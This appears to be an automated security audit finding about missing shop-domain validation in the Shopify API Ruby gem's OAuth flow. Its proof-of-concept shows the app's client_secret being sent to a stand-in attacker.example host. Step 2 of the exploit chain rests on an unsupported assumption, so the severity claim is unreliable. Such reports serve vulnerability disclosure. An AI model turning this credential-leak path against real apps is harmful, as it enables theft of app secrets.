Confirmed: `ShopifyAPI::Auth::Oauth.begin_auth` and `ShopifyAPI::Auth::Oauth.validate_auth_callback` — unlike `ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, and `TokenExchange.migrate_to_expiring_token`, which all call `Utils::ShopValidator.sanitize!(shop)` before using the shop value — never validate `shop` against `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`.

### Title
OAuth flow sends `client_secret` and access-token requests to an unvalidated `shop` host, unlike every other grant type in the gem - ([File: lib/shopify_api/auth/oauth.rb])

### Summary
`ShopifyAPI::Auth::Oauth.begin_auth` and `ShopifyAPI::Auth::Oauth.validate_auth_callback` use the caller-supplied `shop` string directly to build the host that receives the OAuth authorize redirect and, critically, the host that receives the POST containing `client_id`/`client_secret` during the code exchange — with no call to `Utils::ShopValidator.sanitize!`.

### Finding Description
In `Auth::Oauth`, `auth_base_uri(shop)` builds `"https://#{shop}/admin"` directly from the `shop:` keyword argument passed into `begin_auth` [1](#0-0) . `validate_auth_callback` similarly builds `null_session = Auth::Session.new(shop: auth_query.shop)` from the (HMAC-verified only against the *value* supplied, not against a trusted-domain allowlist) `shop` field of the callback query, and this session's `shop` is what `Clients::HttpClient` uses to construct `@base_uri = "https://#{api_host || session.shop}"` — the exact host that then receives `client_id`/`client_secret` in the POST body when requesting the access token [2](#0-1) [3](#0-2) .

This is the exact binding failure the bug-class hint describes: "the host validated versus the host that receives the access token or `client_secret`." Every other credential-issuing entry point in this same module tree enforces the equality `validated_shop == host_that_receives_client_secret` by calling `Utils::ShopValidator.sanitize!(shop)` first:
- `ClientCredentials.client_credentials` [4](#0-3) 
- `RefreshToken.refresh_access_token` [5](#0-4) 
- `TokenExchange.migrate_to_expiring_token` [6](#0-5) 

`Oauth.begin_auth`/`Oauth.validate_auth_callback` are the only two credential-issuing flows in `lib/shopify_api/auth/` that skip this check [7](#0-6) . The `HmacValidator.validate(auth_query)` call only proves that the query string (which includes `shop`) was signed by the app's own secret in a genuine round-trip from Shopify's OAuth server for whatever `shop` value that server put in the redirect — it never constrains `shop` to `*.myshopify.com`/`*.myshopify.io`/etc. If a host application passes a user-supplied, unsanitized `shop` value straight into `begin_auth` (which is exactly the intended calling convention per `docs/usage/oauth.md`, taking a raw shop string from the request), a malicious value such as `attacker.example` flows unchecked into `auth_base_uri`, and if that same value later round-trips through Shopify's OAuth authorize step (Shopify redirects back with the same `shop` param it was sent, and computes the HMAC itself), `validate_auth_callback` will build the access-token exchange request against `https://attacker.example/admin/oauth/access_token`, sending the app's `client_id` and `client_secret` there.

### Impact Explanation
This matches the High-impact category "credential leakage into logs or error output" more precisely it is direct leakage of the app's `client_secret` to an attacker-controlled host during the OAuth code-exchange POST — a credential exfiltration path enabled purely by the gem's own missing validation, consistent with the "SSRF with the app's credentials" category since the request (carrying `client_secret`) is server-side and directed by the unvalidated `shop` value.

### Likelihood Explanation
Exploitability depends on the host application passing through a `shop` value that isn't already constrained by the host app's own logic (the gem's docs show `begin_auth`/`validate_auth_callback` taking `shop` straight from request parameters). Given that this gem itself provides `ShopValidator` and applies it to three of its four OAuth-adjacent grant paths but omits it from the two functions that make up the classic Authorization Code flow, this is a real internal inconsistency, not merely a "host app ignored documented API" situation — the gem's own sibling functions demonstrate the correct binding was known and implemented elsewhere but omitted here.

### Recommendation
Call `Utils::ShopValidator.sanitize!(shop)` at the start of `Oauth.begin_auth` and use `auth_query.shop` only after passing it through `Utils::ShopValidator.sanitize!` in `Oauth.validate_auth_callback`, mirroring `ClientCredentials`, `RefreshToken`, and `TokenExchange.migrate_to_expiring_token`.

### Proof of Concept
1. Host app calls `ShopifyAPI::Auth::Oauth.begin_auth(shop: "attacker.example", redirect_path: "/callback")`, which produces `auth_route = "https://attacker.example/admin/oauth/authorize?..."` [8](#0-7) .
2. If this route is reachable by Shopify's own OAuth server acting on behalf of a real merchant shop with that same string in the `shop` param, Shopify's callback redirect will carry `shop=attacker.example` together with a valid HMAC signed by the app's real secret over that value.
3. `validate_auth_callback` validates the HMAC successfully (it only proves the string wasn't tampered with, not that it is a trusted domain) and calls `Auth::Session.new(shop: "attacker.example")` [9](#0-8) .
4. `Clients::HttpClient.new(session: null_session, ...)` builds `@base_uri = "https://attacker.example"` [10](#0-9)  and POSTs the body containing `client_secret: Context.api_secret_key` to `https://attacker.example/admin/oauth/access_token` [11](#0-10) , leaking the app's `client_secret` to the attacker's server.
